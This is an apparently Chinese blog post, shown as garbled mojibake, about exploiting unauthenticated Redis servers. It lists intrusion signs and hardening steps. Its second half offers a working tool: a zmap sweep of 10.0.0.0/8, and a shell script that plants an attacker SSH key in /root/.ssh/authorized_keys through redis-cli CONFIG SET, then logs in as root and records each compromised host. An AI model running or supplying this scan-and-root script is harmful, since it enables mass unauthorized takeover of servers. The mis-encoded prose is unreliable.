I" <p>https://ruby-china.org/topics/28094
å†…ç½‘ä¸­ 60% å¼€æ”¾äº† redis6379 ç«¯å£çš„ä¸»æœºå¤„äºå¯ä»¥è¢«åˆ©ç”¨çš„å±é™©çŠ¶æ€ï¼Œå› ä¸ºéƒ½æ˜¯ä¸€äº›é»˜è®¤é…ç½®é€ æˆçš„
Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰å¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨ Redis çš„ç›¸å…³æ–¹æ³•ï¼Œå¯ä»¥æˆåŠŸåœ¨ Redis æœåŠ¡å™¨ä¸Šå†™å…¥å…¬é’¥ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚
<!-- more -->
å…¥ä¾µç‰¹å¾ï¼š</p>

<p>Redis å¯èƒ½æ‰§è¡Œè¿‡ FLUSHALL æ–¹æ³•ï¼Œæ•´ä¸ª Redis æ•°æ®åº“è¢«æ¸…ç©º
åœ¨ Redis æ•°æ®åº“ä¸­æ–°å»ºäº†ä¸€ä¸ªåä¸º crackitï¼ˆç½‘ä¸Šæµä¼ çš„å‘½ä»¤æŒ‡ä»¤ï¼‰ çš„é”®å€¼å¯¹ï¼Œå†…å®¹ä¸ºä¸€ä¸ª SSH å…¬é’¥ã€‚
åœ¨ /root/.ssh æ–‡ä»¶å¤¹ä¸‹æ–°å»ºæˆ–è€…ä¿®æ”¹äº† authorized_keys æ–‡ä»¶ï¼Œå†…å®¹ä¸º Redis ç”Ÿæˆçš„ db æ–‡ä»¶ï¼ŒåŒ…å«ä¸Šè¿°å…¬é’¥
ä¸‰ã€ä¿®å¤å»ºè®®
1.ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤
ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ </p>

<p>rename-command FLUSHALL â€œâ€
rename-command CONFIG   â€œâ€
rename-command EVAL     â€œâ€
æ¥ç¦ç”¨è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€</p>

<p>2.ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡
ä¸º Redis æœåŠ¡åˆ›å»ºå•ç‹¬çš„ç”¨æˆ·å’Œå®¶ç›®å½•ï¼Œå¹¶ä¸”é…ç½®ç¦æ­¢ç™»é™†</p>

<p>3.ä¸º Redis æ·»åŠ å¯†ç éªŒè¯
ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ </p>

<p>requirepass mypassword
4.ç¦æ­¢å¤–ç½‘è®¿é—® Redis
ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ æˆ–ä¿®æ”¹</p>

<p>bind 127.0.0.1
ä½¿å¾— Redis æœåŠ¡åªåœ¨å½“å‰ä¸»æœºå¯ç”¨</p>

<p>å››ã€æ‰«æå·¥å…·
1 ä½¿ç”¨è¯´æ˜
#ä»¥Ubuntuä¸ºä¾‹
su</p>

<h1 id="requirements">Requirements</h1>
<p>apt-get install redis-server expect zmap</p>

<p>git clone https://github.com/qingxp9/yyfexploit
cd yyfexploit/redis</p>

<h1 id="æ‰«æ6379ç«¯å£">æ‰«æ6379ç«¯å£</h1>
<h1 id="å¦‚æœä½ è¦æ‰«å†…ç½‘æŠŠetczmapzmapconfä¸­blacklist-fileè¿™ä¸€è¡Œæ³¨é‡Šæ‰">å¦‚æœä½ è¦æ‰«å†…ç½‘ï¼ŒæŠŠ/etc/zmap/zmap.confä¸­blacklist-fileè¿™ä¸€è¡Œæ³¨é‡Šæ‰</h1>
<p>zmap -p 6379 10.0.0.0/8 -B 10M -o ip.txt</p>

<h1 id="usage">Usage</h1>
<p>./redis.sh ip.txt
æœ€åï¼Œå°†ä¼šç”Ÿæˆå‡ ä¸ª txt æ–‡ä»¶è®°å½•ç»“æœ å…¶ä¸­ï¼š runasroot.txt è¡¨ç¤º redis æ— è®¤è¯ï¼Œä¸”ä»¥ root è¿è¡Œ noauth.txt è¡¨ç¤º redis æ— è®¤è¯ï¼Œä½†ä»¥æ™®é€šç”¨æˆ·è¿è¡Œ rootshell.txt å·²å†™å…¥å…¬é’¥ï¼Œå¯ç›´æ¥ä»¥è¯ä¹¦ç™»å½• root ç”¨æˆ·</p>

<p>åƒè¿™æ ·ï¼š</p>

<p>ssh -i id_rsa root@x.x.x.x
2 å·¥å…·æºä»£ç 
å°±è´´ä¸‹ä»£ç å§ï¼Œå„ä½å¤§ç‰›è¯·åœ¨å®¶é•¿é™ªåŒä¸‹è§‚çœ‹</p>

<p>#!/bin/sh
 if [ $# -eq 1  ]
 then
   ip_list=$1</p>

<p>##create id_rsa
   echo â€œ<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>Create id_rsa fileâ€</p>

<p>expect -c â€œ
     spawn ssh-keygen -t rsa -f id_rsa -C "yyf"
     expect {
         "<em>passphrase): " {
             exp_send "\r"
             exp_continue
         }
         "</em>again: " {
             exp_send "\r"
         }
         "*y/n)? " {
             exp_send "n\r"
         }
     }
     expect eof
   â€œ</p>

<p>echo â€œ\n\n<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**Attack Targetsâ€
   touch noauth.txt runasroot.txt rootshell.txt haveauth.txt
   i=0
   cat $ip_list | while read ip
   do
     i=<code class="language-plaintext highlighter-rouge">expr $i + 1</code>;
     #write id_rsa.pub to remote
     echo â€œ</strong><strong><em>${i}</em></strong>connect to remote ${ip} redis â€œ</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> expect -c "
   set timeout 3
   spawn redis-cli -h $ip config set dir /root/.ssh/
   expect {
     \"OK\"                        { exit 0 }
     \"ERR Changing directory: Permission denied\"         { exit 1 }
     timeout                       { exit 2 }
     \"(error) NOAUTH Authentication required\"         { exit 3 }
   }
 "

 case $? in
     0)  echo "run redis as root"
         echo $ip &gt;&gt; noauth.txt
         echo $ip &gt;&gt; runasroot.txt
     ;;
     1)  echo "not run redis as root\n\n\n"
         echo $ip &gt;&gt; noauth.txt
         continue
     ;;
     2)  echo "connect timeout\n\n\n"
         continue
     ;;
     3)  echo "Have Auth\n\n\n"
         echo $ip &gt;&gt; haveauth.txt
         continue
     ;;
 esac

 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt
 cat foo.txt | redis-cli -h $ip -x set 1
 redis-cli -h $ip config set dir /root/.ssh/
 redis-cli -h $ip config set dbfilename "authorized_keys"
 redis-cli save

 #login test
 echo "#try to login"
 expect -c "
   set timeout 5
   spawn ssh -i id_rsa root@$ip echo \"yyf\"
   expect {
     \"*yes/no\"     { send \"yes\n\"}

     \"*password\"   { send \"\003\"; exit 1 }
     \"yyf\"         { exit 0 }
     timeout         { exit 2 }
   }
   exit 4
 "

 exitcode=$?

 if [ $exitcode -eq 0 ]
 then
   echo "---------------${ip} is get root shell"
   echo $ip &gt;&gt; rootshell.txt
 fi

 echo "\n\n\n"    done
</code></pre></div></div>

<p>echo â€œ##########Final Count##########â€
   wc -l $ip_list
   echo â€œâ€”â€”â€”-â€œ
   wc -l noauth.txt
   wc -l runasroot.txt
   wc -l rootshell.txt
   echo â€œâ€”â€”â€”-â€œ
   wc -l haveauth.txt</p>

<p>else
   echo â€œusage: ./redis.sh ip.txtâ€
 fi
äº”ã€ç›¸å…³å‚è€ƒ
http://zone.wooyun.org/content/23858
https://blog.islandzero.net/2015/11/11/redis-crackit/
http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</p>
:ET